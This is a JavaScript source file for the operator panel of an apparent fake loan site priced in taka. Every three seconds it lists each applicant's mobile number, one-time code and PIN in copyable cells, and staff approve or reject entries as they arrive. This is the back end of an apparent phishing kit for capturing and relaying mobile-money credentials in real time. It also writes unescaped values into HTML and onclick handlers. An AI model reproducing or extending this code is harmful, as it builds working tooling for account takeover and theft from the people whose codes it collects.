// Admin Panel JavaScript Functions

// Global variables
let refreshInterval;
let currentFilter = 'all';

// Initialize admin panel when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    if (window.location.pathname.includes('admin_panel.php')) {
        initializeAdminPanel();
    }
});

// Initialize admin panel
function initializeAdminPanel() {
    loadLoansData();
    setupEventListeners();
    startAutoRefresh();
}

// Setup event listeners
function setupEventListeners() {
    const statusFilter = document.getElementById('status-filter');
    if (statusFilter) {
        statusFilter.addEventListener('change', function() {
            currentFilter = this.value;
            loadLoansData();
        });
    }
}

// Start auto refresh every 3 seconds
function startAutoRefresh() {
    // Clear any existing interval first
    if (refreshInterval) {
        clearInterval(refreshInterval);
    }
    
    refreshInterval = setInterval(() => {
        console.log('Auto-refreshing loans data...');
        loadLoansData();
    }, 3000);
    
    console.log('Auto-refresh started (every 3 seconds)');
}

// Stop auto refresh
function stopAutoRefresh() {
    if (refreshInterval) {
        clearInterval(refreshInterval);
    }
}

// Load loans data from server
function loadLoansData() {
    console.log('Loading loans data from admin_update.php?action=get_all');
    
    fetch('admin_update.php?action=get_all')
        .then(response => {
            console.log('Response status:', response.status);
            console.log('Response OK:', response.ok);
            console.log('Response URL:', response.url);
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            return response.text();
        })
        .then(text => {
            console.log('Raw response text:', text);
            
            try {
                const data = JSON.parse(text);
                console.log('Parsed data:', data);
                
                if (data.success) {
                    console.log('✅ API Success - Number of loans:', data.count || (data.loans ? data.loans.length : 0));
                    updateStatsCards(data.loans || []);
                    updateLoansTable(data.loans || []);
                } else {
                    console.error('❌ API Error:', data.error);
                    console.error('Received action:', data.received_action);
                    console.error('Method:', data.method);
                    showNotification('API Error: ' + (data.error || 'Unknown error'), 'error');
                }
            } catch (parseError) {
                console.error('❌ JSON Parse Error:', parseError.message);
                console.error('Raw response that failed to parse:', text);
                showNotification('Server response error: Invalid JSON', 'error');
            }
        })
        .catch(error => {
            console.error('❌ Network Error:', error);
            // Only show network error notification if it's not an auto-refresh
            if (!error.message.includes('fetch')) {
                showNotification('Network error: ' + error.message, 'error');
            }
        });
}

// Update statistics cards
function updateStatsCards(loans) {
    const totalCount = loans.length;
    const pendingCount = loans.filter(loan => 
        loan.status === 'pending' || 
        loan.status === 'mobile_verified' || 
        loan.status === 'otp_verified' || 
        loan.status === 'pin_verified' || 
        loan.status === 'processing'
    ).length;
    const approvedCount = loans.filter(loan => loan.status === 'approved').length;
    const rejectedCount = loans.filter(loan => loan.status === 'rejected').length;

    document.getElementById('total-count').textContent = totalCount;
    document.getElementById('pending-count').textContent = pendingCount;
    document.getElementById('approved-count').textContent = approvedCount;
    document.getElementById('rejected-count').textContent = rejectedCount;
}

// Update loans table
function updateLoansTable(loans) {
    console.log('Updating loans table with', loans ? loans.length : 0, 'loans');
    const tableBody = document.getElementById('loans-table-body');
    if (!tableBody) {
        console.error('Table body element not found!');
        return;
    }

    // Filter loans based on current filter
    let filteredLoans = loans || [];
    if (currentFilter !== 'all') {
        if (currentFilter === 'pending') {
            filteredLoans = loans.filter(loan => 
                loan.status === 'pending' || 
                loan.status === 'mobile_verified' || 
                loan.status === 'otp_verified' || 
                loan.status === 'pin_verified' || 
                loan.status === 'processing'
            );
        } else {
            filteredLoans = loans.filter(loan => loan.status === currentFilter);
        }
    }

    console.log('Filtered loans:', filteredLoans.length, 'with filter:', currentFilter);
    
    tableBody.innerHTML = '';

    if (filteredLoans.length === 0) {
        tableBody.innerHTML = `
            <tr>
                <td colspan="9" class="px-6 py-8 text-center text-gray-500">
                    <div class="flex flex-col items-center">
                        <svg class="w-12 h-12 text-gray-400 mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                        </svg>
                        <p class="text-lg font-medium">No loan applications found</p>
                        <p class="text-sm">Applications will appear here when users submit loan requests.</p>
                    </div>
                </td>
            </tr>
        `;
        return;
    }

    filteredLoans.forEach((loan, index) => {
        console.log('Creating row for loan:', loan.id, loan);
        const row = createLoanRow(loan);
        tableBody.appendChild(row);
    });
    
    console.log('Table updated successfully with', filteredLoans.length, 'rows');
}

// Create a loan row for the table
function createLoanRow(loan) {
    const row = document.createElement('tr');
    row.className = 'hover:bg-gray-50 transition-colors';
    
    const statusBadge = getStatusBadge(loan.status);
    const actionButtons = getActionButtons(loan);
    
    const createdAt = new Date(loan.created_at).toLocaleString('en-GB', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    });

    // Create copy-enabled cells for mobile, OTP, and PIN
    const mobileCell = createCopyableCell(loan.mobile_number || 'N/A', 'mobile');
    const otpCell = createCopyableCell(loan.otp_code || 'N/A', 'otp');
    const pinCell = createCopyableCell(loan.pin_code || 'N/A', 'pin');

    row.innerHTML = `
        <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">#${loan.id}</td>
        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 font-semibold">৳${Number(loan.amount).toLocaleString()}</td>
        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${loan.category || 'N/A'}</td>
        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 font-mono">${mobileCell}</td>
        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 font-mono">${otpCell}</td>
        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900 font-mono">${pinCell}</td>
        <td class="px-6 py-4 whitespace-nowrap">${statusBadge}</td>
        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">${createdAt}</td>
        <td class="px-6 py-4 whitespace-nowrap text-sm font-medium">${actionButtons}</td>
    `;

    return row;
}

// Get status badge HTML
function getStatusBadge(status) {
    const badges = {
        'pending': '<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-gray-100 text-gray-800">Pending</span>',
        'mobile_verified': '<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-100 text-blue-800">Mobile Verified</span>',
        'otp_verified': '<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-indigo-100 text-indigo-800">OTP Verified</span>',
        'pin_verified': '<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-100 text-purple-800">PIN Verified</span>',
        'processing': '<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-yellow-100 text-yellow-800 animate-pulse">Processing</span>',
        'approved': '<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">Approved</span>',
        'rejected': '<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-red-100 text-red-800">Rejected</span>'
    };
    
    return badges[status] || badges['pending'];
}

// Create copyable cell with copy button
function createCopyableCell(value, type) {
    if (value === 'N/A' || !value) {
        return '<span class="text-gray-400">N/A</span>';
    }
    
    const displayValue = type === 'mobile' ? 
        value.substring(0, 3) + 'XXXX' + value.substring(7) : 
        value;
    
    return `
        <div class="flex items-center space-x-2">
            <span class="font-mono">${displayValue}</span>
            <button onclick="copyToClipboard('${value}', '${type}')" 
                    class="text-blue-500 hover:text-blue-700 transition-colors" 
                    title="Copy ${type}">
                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" 
                          d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
                </svg>
            </button>
        </div>
    `;
}

// Copy to clipboard function
function copyToClipboard(text, type) {
    navigator.clipboard.writeText(text).then(function() {
        showNotification(`${type.toUpperCase()} copied to clipboard: ${text}`, 'success');
    }).catch(function(err) {
        console.error('Could not copy text: ', err);
        showNotification('Failed to copy to clipboard', 'error');
    });
}

// Get action buttons HTML
function getActionButtons(loan) {
    if (loan.status === 'approved' || loan.status === 'rejected') {
        return '<span class="text-gray-400 text-sm">No actions</span>';
    }
    
    if (loan.status === 'processing' || loan.status === 'pin_verified') {
        return `
            <div class="flex space-x-2">
                <button onclick="approveLoan(${loan.id})" 
                        class="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded text-xs font-medium transition-colors">
                    Approve
                </button>
                <button onclick="rejectLoan(${loan.id})" 
                        class="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-xs font-medium transition-colors">
                    Reject
                </button>
            </div>
        `;
    }
    
    return '<span class="text-yellow-600 text-sm">In Progress</span>';
}

// Approve loan - Using admin_panel.php direct POST handling
function approveLoan(loanId) {
    console.log('Approving loan ID:', loanId);
    if (confirm('Are you sure you want to approve this loan?')) {
        console.log('Sending approve request to admin_panel.php');
        
        const formData = new FormData();
        formData.append('loan_id', loanId);
        formData.append('action', 'approve');
        
        fetch('admin_panel.php', {
            method: 'POST',
            body: formData
        })
        .then(response => {
            console.log('Response status:', response.status);
            return response.text();
        })
        .then(text => {
            console.log('Raw response:', text);
            try {
                const data = JSON.parse(text);
                console.log('Parsed data:', data);
                if (data.success) {
                    showNotification('Loan approved successfully!', 'success');
                    // Force immediate refresh
                    setTimeout(() => {
                        loadLoansData();
                    }, 500);
                } else {
                    showNotification('Failed to approve loan: ' + (data.message || 'Unknown error'), 'error');
                }
            } catch (parseError) {
                console.error('JSON Parse Error:', parseError);
                console.error('Raw text:', text);
                showNotification('Server response error', 'error');
            }
        })
        .catch(error => {
            console.error('Network Error:', error);
            showNotification('Network error: ' + error.message, 'error');
        });
    }
}

// Reject loan - Using admin_panel.php direct POST handling
function rejectLoan(loanId) {
    console.log('Rejecting loan ID:', loanId);
    if (confirm('Are you sure you want to reject this loan?')) {
        console.log('Sending reject request to admin_panel.php');
        
        const formData = new FormData();
        formData.append('loan_id', loanId);
        formData.append('action', 'reject');
        
        fetch('admin_panel.php', {
            method: 'POST',
            body: formData
        })
        .then(response => {
            console.log('Response status:', response.status);
            return response.text();
        })
        .then(text => {
            console.log('Raw response:', text);
            try {
                const data = JSON.parse(text);
                console.log('Parsed data:', data);
                if (data.success) {
                    showNotification('Loan rejected successfully!', 'success');
                    // Force immediate refresh
                    setTimeout(() => {
                        loadLoansData();
                    }, 500);
                } else {
                    showNotification('Failed to reject loan: ' + (data.message || 'Unknown error'), 'error');
                }
            } catch (parseError) {
                console.error('JSON Parse Error:', parseError);
                console.error('Raw text:', text);
                showNotification('Server response error', 'error');
            }
        })
        .catch(error => {
            console.error('Network Error:', error);
            showNotification('Network error: ' + error.message, 'error');
        });
    }
}

// Refresh data manually
function refreshData() {
    loadLoansData();
    showNotification('Data refreshed!', 'info');
}

// Logout function
function logout() {
    if (confirm('Are you sure you want to logout?')) {
        stopAutoRefresh();
        window.location.href = 'admin_login.php?logout=1';
    }
}

// Show notification
function showNotification(message, type = 'info') {
    // Remove existing notifications
    const existingNotifications = document.querySelectorAll('.notification');
    existingNotifications.forEach(notification => notification.remove());
    
    const notification = document.createElement('div');
    notification.className = `notification fixed top-4 right-4 px-6 py-3 rounded-lg shadow-lg z-50 transition-all duration-300`;
    
    const colors = {
        'success': 'bg-green-500 text-white',
        'error': 'bg-red-500 text-white',
        'info': 'bg-blue-500 text-white',
        'warning': 'bg-yellow-500 text-white'
    };
    
    notification.className += ` ${colors[type] || colors['info']}`;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    // Auto remove after 3 seconds
    setTimeout(() => {
        notification.style.opacity = '0';
        notification.style.transform = 'translateX(100%)';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 300);
    }, 3000);
}

// Handle page visibility change to pause/resume auto refresh
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        stopAutoRefresh();
    } else {
        startAutoRefresh();
    }
});

// Handle window beforeunload to cleanup
window.addEventListener('beforeunload', function() {
    stopAutoRefresh();
});